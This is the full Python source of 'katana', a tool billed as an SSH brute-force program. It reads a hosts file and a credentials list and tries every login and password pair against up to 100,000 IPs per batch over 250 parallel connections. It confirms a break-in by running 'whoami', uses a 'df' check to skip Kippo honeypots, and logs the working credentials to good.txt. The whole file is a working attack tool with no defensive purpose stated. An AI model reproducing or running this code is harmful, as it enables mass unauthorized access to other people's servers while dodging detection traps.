import asyncio
import argparse
from itertools import islice
from asyncssh import connect
import re
import time
from asyncssh.misc import ConnectionLost, PermissionDenied, ProtocolNotSupported, ChannelOpenError,\
    ProtocolError

intro = ['                                      ',
         '  		katana - the ssh bruteforce tool',
         '              /\\',
         '  /vvvvvvvvvvvv \\--------------------------------------,',
         '  `^^^^^^^^^^^^ /====================================="',
         '              \/',
         '                  by dortmund457',
         '']

kippo = '/dev/disk/by-uuid/65626fdc-e4c5-4539-8745-edc212b9b0af'
index = 0


def print_logo():
    for i in intro:
        print(i)
    time.sleep(2)


def parse_args():
    parser = argparse.ArgumentParser(description='katana - the ssh bruteforce tool')
    parser.add_argument('path', type=str, help='path to hosts file')
    parser.add_argument('-c', '--connections',  type=int, default=250, help='count of parallel connections')
    parser.add_argument('-t', '--timeout', type=int, default=7, help='timeout')
    parser.add_argument('-dp', action='store_true', help='disable stdout printing')
    parser.add_argument('-ch', action='store_true', help='check if host is honeypot')
    return parser.parse_args()


def get_index():
    global index
    index += 1
    return index


def load_credentials():
    with open('credentials.txt') as file:
        return [(line.split(':')[0], line.split(':')[1].strip()) for line in file.readlines()]


def load_hosts():
    with open(args.path) as file:
        for line in file:
            yield ''.join(re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line))


def save_result(file, fh, ip, login, password):
    print(f'{ip}:{login}:{password}', file=fh[file])
    if not args.dp:
        print(f'[{get_index()}]\t\t[{file}]\t\t{ip}')




def chunks(n, iterable):
    i = iter(iterable)
    piece = list(islice(i, n))
    while piece:
        yield piece
        piece = list(islice(i, n))




def is_honeypot(text):
    if kippo in text:
        return True
    else:
        return False


def open_files():
    files = {'good': open('good.txt', 'a'),
             'bad': open('bad.txt', 'a'),
             'wrong': open('wrong.txt', 'a'),
             'honeypot': open('honeypot.txt', 'a')}
    return files


def close_files(file_handle):
    for file in file_handle:
        file_handle[file].close()


async def make_connection(ip, login, password):
    try:
        async with connect(ip, username=login, password=password, known_hosts=None) as conn:
            whoami = await conn.run('whoami', check=True, timeout=args.timeout)
            if whoami.stdout.strip().lower() == login:
                if args.ch:
                    df = await conn.run('df', check=True, timeout=args.timeout)
                    if is_honeypot(df.stdout.strip().lower()):
                        return 3
                return 0
    except (ConnectionRefusedError, TimeoutError, ConnectionResetError):
        return 1
    except (ProtocolError, ConnectionLost, ProtocolNotSupported, ChannelOpenError):
        return 1
    except PermissionDenied:
        return 2
    except Exception:
        return 1


async def work(ip, login, password, fh):
    async with semaphore:
        try:
            result = await asyncio.wait_for(make_connection(ip, login, password), timeout=args.timeout)

            if result == 1:
                save_result('bad', fh, ip, login, password)
            if result == 2:
                save_result('wrong', fh, ip, login, password)
            if result == 0:
                save_result('good', fh, ip, login, password)
            if result == 3:
                save_result('honeypot', fh, ip, login, password)

        except asyncio.TimeoutError:
            save_result('bad', fh, ip, login, password)


async def run(targets, login, password, fh):
    print(f'Go {len(targets)} to check')
    print(f'Cheking now for {login}:{password}')
    tasks = []
    for target in targets:
        tasks.append(work(target, login, password, fh))
    await asyncio.gather(*tasks)




def main():
    fh = open_files()
    for login, password in load_credentials():
        targets = chunks(100000, load_hosts())
        for chunk in targets:
            loop = asyncio.get_event_loop()
            future = asyncio.ensure_future(run(chunk, login, password, fh))
            loop.run_until_complete(future)
    close_files(fh)




if __name__ == '__main__':
    args = parse_args()
    print_logo()
    semaphore = asyncio.Semaphore(args.connections)
    main()
